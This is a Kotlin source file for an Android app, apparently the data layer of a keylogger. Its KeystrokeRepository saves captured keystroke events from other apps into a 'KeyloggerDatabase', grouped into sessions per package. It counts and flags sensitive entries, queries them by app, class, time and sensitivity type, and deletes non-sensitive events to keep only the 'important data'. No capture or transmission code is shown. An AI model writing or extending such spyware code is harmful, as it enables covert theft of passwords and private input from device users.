package com.android.myapp.data.repository

import android.content.Context
import com.android.myapp.data.CapturedEvent
import com.android.myapp.data.KeyloggerDatabase
import com.android.myapp.data.Session
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import timber.log.Timber
import java.util.concurrent.TimeUnit

class KeystrokeRepository(context: Context) {

    private val database = KeyloggerDatabase.Companion.getInstance(context)
    private val eventDao = database.capturedEventDao()
    private val sessionDao = database.sessionDao()

    private var currentSession: Session? = null

    /**
     * Save a captured event
     */
    suspend fun saveEvent(event: CapturedEvent) = withContext(Dispatchers.IO) {
        try {
            // Get or create session
            val session = getOrCreateSession(event.packageName)

            // Associate event with session
            val eventWithSession = event.copy(sessionId = session.id)

            // Insert event
            eventDao.insert(eventWithSession)

            // Update session stats
            updateSessionStats(session, event)

            Timber.Forest.d("Event saved: ${event.packageName} - ${event.eventType}")
        } catch (e: Exception) {
            Timber.Forest.e(e, "Failed to save event")
        }
    }

    private suspend fun getOrCreateSession(packageName: String): Session {
        // Check if there's an active session for this package
        var session = currentSession

        if (session == null || session.packageName != packageName) {
            // Try to get active session from DB
            session = sessionDao.getActiveSession()

            // If different package or no active session, create new one
            if (session == null || session.packageName != packageName) {
                // Close old session if exists
                session?.let { closeSession(it) }

                // Create new session
                session = Session(
                    startTime = System.currentTimeMillis(),
                    packageName = packageName,
                    totalKeystrokes = 0,
                    sensitiveDataCount = 0
                )
                val sessionId = sessionDao.insert(session)
                session = session.copy(id = sessionId)
            }

            currentSession = session
        }

        return session
    }

    private suspend fun updateSessionStats(session: Session, event: CapturedEvent) {
        val updated = session.copy(
            totalKeystrokes = session.totalKeystrokes + 1,
            sensitiveDataCount = session.sensitiveDataCount + if (event.isSensitive) 1 else 0
        )
        sessionDao.update(updated)
        currentSession = updated
    }

    private suspend fun closeSession(session: Session) {
        val closed = session.copy(endTime = System.currentTimeMillis())
        sessionDao.update(closed)
    }

    /**
     * Get recent events
     */
    suspend fun getRecentEvents(limit: Int = 1000): List<CapturedEvent> =
        withContext(Dispatchers.IO) {
            eventDao.getRecent(limit)
        }

    /**
     * Get sensitive events
     */
    suspend fun getSensitiveEvents(): List<CapturedEvent> =
        withContext(Dispatchers.IO) {
            eventDao.getSensitiveEvents()
        }

    /**
     * Get events by package
     */
    suspend fun getEventsByPackage(packageName: String, limit: Int = 1000): List<CapturedEvent> =
        withContext(Dispatchers.IO) {
            eventDao.getEventsByPackage(packageName, limit)
        }

    /**
     * Get events by className
     */
    suspend fun getEventsByClassName(className: String, limit: Int = 1000): List<CapturedEvent> =
        withContext(Dispatchers.IO) {
            eventDao.getEventsByClassName(className, limit)
        }

    /**
     * Get events by time range
     */
    suspend fun getEventsByTimeRange(startTime: Long, endTime: Long): List<CapturedEvent> =
        withContext(Dispatchers.IO) {
            eventDao.getEventsByTimeRange(startTime, endTime)
        }

    /**
     * Get events by sensitivity type
     */
    suspend fun getEventsBySensitivityType(type: String, limit: Int = 1000): List<CapturedEvent> =
        withContext(Dispatchers.IO) {
            eventDao.getEventsBySensitivityType(type, limit)
        }

    /**
     * Get recent sessions
     */
    suspend fun getRecentSessions(limit: Int = 50): List<Session> =
        withContext(Dispatchers.IO) {
            sessionDao.getRecentSessions(limit)
        }

    /**
     * Clean up old data
     */
    suspend fun cleanupOldData(daysToKeep: Int = 30) = withContext(Dispatchers.IO) {
        val cutoffTime = System.currentTimeMillis() - TimeUnit.DAYS.toMillis(daysToKeep.toLong())

        val eventsDeleted = eventDao.deleteOldEvents(cutoffTime)
        val sessionsDeleted = sessionDao.deleteOldSessions(cutoffTime)

        Timber.Forest.d("Cleanup: deleted $eventsDeleted events and $sessionsDeleted sessions")
    }

    /**
     * Delete non-sensitive events (keep only important data)
     */
    suspend fun deleteNonSensitiveEvents() = withContext(Dispatchers.IO) {
        val deleted = eventDao.deleteNonSensitiveEvents()
        Timber.Forest.d("Deleted $deleted non-sensitive events")
    }

    /**
     * Get statistics
     */
    suspend fun getStatistics(): Statistics = withContext(Dispatchers.IO) {
        Statistics(
            totalEvents = eventDao.getCount(),
            sensitiveEvents = eventDao.getSensitiveCount(),
            recentSessions = sessionDao.getRecentSessions(10).size
        )
    }

    /**
     * Clear all data (for testing or user request)
     */
    suspend fun clearAllData() = withContext(Dispatchers.IO) {
        eventDao.deleteAll()
        sessionDao.deleteAll()
        currentSession = null
        Timber.Forest.d("All data cleared")
    }

    data class Statistics(
        val totalEvents: Int,
        val sensitiveEvents: Int,
        val recentSessions: Int
    )
}